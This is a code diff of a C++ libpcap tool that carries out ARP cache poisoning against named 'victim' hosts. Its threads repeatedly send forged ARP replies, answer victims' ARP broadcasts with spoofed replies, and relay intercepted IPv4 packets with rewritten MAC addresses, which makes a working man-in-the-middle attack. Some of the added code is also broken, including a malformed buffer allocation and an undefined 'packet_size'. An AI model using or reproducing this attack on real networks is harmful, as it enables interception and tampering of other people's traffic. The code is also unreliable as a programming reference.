@@ -24,34 +24,25 @@ void makeArpPacket(EthArpPacket* packet, Mac eth_dmac, Mac eth_smac, Mac arp_tma
 	packet->arp_.tip_ = htonl(arp_tip);
 }
 
-Mac getotherMac(pcap_t* inhandle, Ip tarip)
+Mac getotherMac(pcap_t* handle, Ip tarip)
 {
-	u_int16_t* ethtype = NULL;
-	u_int16_t* arppro = NULL;
-	u_int32_t tip_x;
-	u_int8_t mac_x[6] = {0x00};
-	Ip tip;
+	EthArpPacket newpacket;
 	Mac mac;
 	while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
-		int res = pcap_next_ex(inhandle, &header, &packet);
+		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			return 0;
 		}
-        ethtype = (u_int16_t*)(packet+12);
-		arppro = (u_int16_t*)(packet+16);
-        if(ntohs(*ethtype) == EthHdr::Arp && ntohs(*arppro) == EthHdr::Ip4)
+        memcpy(&newpacket, packet, sizeof(EthArpPacket));
+        if(newpacket.eth_.type() == EthHdr::Arp && newpacket.arp_.pro() == EthHdr::Ip4)
 		{
-			memcpy(&tip_x, packet+28, Ip::SIZE);
-			tip = Ip(ntohl(tip_x));
-			if(tarip == tip)
+			if(newpacket.arp_.op() == ArpHdr::Reply && tarip == newpacket.arp_.sip())
 			{
-				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
-				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11); 
-				mac = mac_x;
+				mac = newpacket.eth_.smac();
 				break;
 			}
 		}
@@ -59,161 +50,100 @@ Mac getotherMac(pcap_t* inhandle, Ip tarip)
 	return mac;
 }
 
-void send_thread(Attackerinfo* attacker, Node* victim, int victimnum, char* interface)
+void send_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
 {
+	int res;
 	char errbuf[PCAP_ERRBUF_SIZE];
     EthArpPacket packet;
-    pcap_t* outhandle = pcap_open_live(interface, 0, 0, 0, errbuf);
-	if (outhandle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
-		exit(-1);
-	}
     while(1)
     {
 		printf("Send: sending packet for keep connection...\n");
-        for(int i =0;i<victimnum;i++)
+        for(int i =0;i<flow;i++)
         {
             makeArpPacket(&packet, victim[i].sender_mac, attacker->mac, victim[i].sender_mac, attacker->mac, victim[i].target_ip, victim[i].sender_ip, rep);
-            int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		    if (res != 0) {
-			    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
+			    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		    }
         }
         sleep(30);
     }
 }
 
-void release_thread(Attackerinfo* attacker, Node* victim, int victimnum, char* interface)
+void release_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
 {
 	int res;
-	EthArpPacket epacket;
+	EthIpPacket newpacket;
 	char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* outhandle = pcap_open_live(interface, 0, 0, 0, errbuf);
-	if (outhandle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
-		exit(-1);
-	}
-	pcap_t* inhandle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
-	if (inhandle == NULL) {
-		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
-		exit(-1);
-	}
-    u_int16_t* ethtype = NULL;
-	u_int16_t* arppro = NULL;
-	u_int8_t mac_x[6] = {0x00};
 	Mac d_mac;
-	u_int32_t sip_x;
-	Ip sip;
-	u_int32_t fake_ip_x;
-	Ip fake_ip;
     while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
-		int res = pcap_next_ex(inhandle, &header, &packet);
+		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			exit(-1);
 		}
-        ethtype = (u_int16_t*)(packet+12);
-		arppro = (u_int16_t*)(packet+16);
-        if(ntohs(*ethtype) == EthHdr::Arp && ntohs(*arppro) == EthHdr::Ip4)
+		memcpy(&newpacket, packet, sizeof(EthIpPacket));
+		for(int i =0;i<flow;i++)
 		{
-			mac_x[0] = *(packet); mac_x[1] = *(packet+1); mac_x[2] = *(packet+2);
-			mac_x[3] = *(packet+3); mac_x[4] = *(packet+4); mac_x[5] = *(packet+5);
-			d_mac = mac_x;
-			if(!d_mac.isBroadcast())
+			if(newpacket.eth_.type() == EthHdr::Ip4 && newpacket.ipv4_hdr.ip_dest() == victim[i].target_ip && newpacket.ipv4_hdr.ip_src() == victim[i].sender_ip)
 			{
-				memcpy(&sip_x, packet+28, Ip::SIZE);
-				sip = Ip(ntohl(sip_x));
-				for(int i = 0;i<victimnum;i++)
+				int size = sizeof(EthHdr) + newpacket.ipv4_hdr.ip_len();
+				u_char* fakepacket = new u_char[sizeof(u_char*size)];
+
+				newpacket.eth_.smac_ = attacker->mac;
+				newpacket.eth_.dmac_ = victim[i].target_mac;
+				
+				memcpy(fakepacket, packet, packet_size);
+				memcpy(fakepacket, &newpacket, sizeof(EthIpPacket));
+
+				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(fakepacket), size);
+				if (res != 0)
 				{
-					printf("Release: IS IT VICTIM??\n");
-					printf("%x\n", uint32_t(sip));
-					if(victim[i].sender_ip == sip)
-					{
-						printf("Release: Yes...Make and Send fake packet to target\n");
-						if(*(packet+21) == 0x01)
-							makeArpPacket(&epacket, victim[i].target_mac, attacker->mac, victim[i].target_mac, attacker->mac, victim[i].sender_ip, victim[i].target_ip, req);
-						else if(*(packet+21) == 0x02)
-							makeArpPacket(&epacket, victim[i].target_mac, attacker->mac, victim[i].target_mac, attacker->mac, victim[i].sender_ip, victim[i].target_ip, rep);
-						res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&epacket), sizeof(EthArpPacket));
-						if (res != 0) {
-							fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
-						}
-						break;
-					}
+					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 				}
+				delete[] fakepacket;
 			}
 		}
 	}
 }
 
-void catch_thread(Attackerinfo* attacker, Node* victim, int victimnum, char* interface)
+void catch_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
 {
+	int res;
 	int flag = 0;
-	EthArpPacket epacket;
+	EthArpPacket newpacket;
+	EthArpPacket fakepacket;
 	char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* outhandle = pcap_open_live(interface, 0, 0, 0, errbuf);
-	if (outhandle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
-		exit(-1);
-	}
-	pcap_t* inhandle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
-	if (inhandle == NULL) {
-		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
-		exit(-1);
-	}
-    u_int16_t* ethtype = NULL;
-	u_int16_t* arppro = NULL;
-	u_int8_t mac_x[6] = {0x00};
-	Mac d_mac;
-	u_int32_t tip_x;
-	Ip tip;
-	u_int32_t fake_ip_x;
-	Ip fake_ip;
     while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
-		int res = pcap_next_ex(inhandle, &header, &packet);
+		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			exit(-1);
 		}
-        ethtype = (u_int16_t*)(packet+12);
-		arppro = (u_int16_t*)(packet+16);
-        if(ntohs(*ethtype) == EthHdr::Arp && ntohs(*arppro) == EthHdr::Ip4)
+		memcpy(&newpacket, packet, sizeof(EthArpPacket));
+        if(newpacket.eth_.type() == EthHdr::Arp && newpacket.arp_.pro() == EthHdr::Ip4)
 		{
-			mac_x[0] = *(packet); mac_x[1] = *(packet+1); mac_x[2] = *(packet+2);
-			mac_x[3] = *(packet+3); mac_x[4] = *(packet+4); mac_x[5] = *(packet+5);
-			d_mac = mac_x;
-			if(d_mac.isBroadcast())
+			if((newpacket.arp_.tmac()).isBroadCast())
 			{
 				printf("Catch: FIND Broadcast!! Is it victim?\n");
-				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
-				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11);
-				d_mac = mac_x;
-				memcpy(&tip_x, packet+28, Ip::SIZE);
-				tip = Ip(ntohl(tip_x));
-				for(int i = 0;i<victimnum;i++)
+				for(int i = 0;i<flow;i++)
 				{
-					if(victim[i].sender_ip == tip)
+					if(victim[i].sender_ip == newpacket.arp_.sip())
 					{
-						flag = 1;
+						printf("Catch: Victim...Attack start!!\n");
+						makeArpPacket(&fakepacket, victim[i].sender_mac, attacker->mac, victim[i].sender_mac, attacker->mac, attacker->ip, victim[i].sender_ip, rep);
+						res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fakepacket), sizeof(EthArpPacket));
+						if (res != 0) {
+							fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+						}
 						break;
 					}
-				}
-				if (flag == 0)
-					continue;
-				flag = 0;
-				printf("Catch: Victim...Attack start!!\n");
-				memcpy(&fake_ip_x, packet+38, Ip::SIZE);
-				fake_ip = Ip(ntohl(fake_ip_x));
-				makeArpPacket(&epacket, d_mac, attacker->mac, d_mac, attacker->mac, fake_ip, tip, rep);
-				int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&epacket), sizeof(EthArpPacket));
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
 				}
 			}
 		}
